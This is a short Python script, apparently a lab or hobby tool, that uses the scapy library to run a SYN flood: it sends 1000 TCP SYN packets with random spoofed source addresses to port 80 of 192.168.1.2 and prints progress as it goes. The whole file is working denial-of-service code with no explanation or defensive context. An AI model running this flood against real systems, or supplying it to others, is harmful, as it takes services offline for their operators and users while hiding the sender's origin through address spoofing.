from scapy.all import *

target_ip = "192.168.1.2"
target_port = 80
n = 1000

def synFloodAttack(target_ip, sport, dport):
    s_addr = RandIP()	
    ip = IP(src=s_addr, dst=target_ip)
    tcp = TCP(sport=sport, dport=dport, flags="S")
    pkt = ip / tcp
    send(pkt, verbose=False)

for i in range(n):
	if (i % 10) == 0:
		print(str(i) + " packets sent")
	synFloodAttack(target_ip, 1234, target_port)
